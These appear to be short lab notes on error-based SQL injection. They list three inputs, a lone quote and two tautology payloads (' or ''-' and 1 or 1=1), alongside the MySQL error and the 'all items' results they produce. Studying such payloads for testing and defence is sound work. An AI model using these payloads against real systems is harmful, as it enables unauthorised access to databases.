# SQL Injection – Error Based

Search: `item=&search='`
Output: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR itemdesc LIKE '%'%' OR categ LIKE '%'%'' at line 1

Search: `item=&search=' or ''-'`
Output: all items

Payload: `item=1 or 1=1&search=`
Output: all items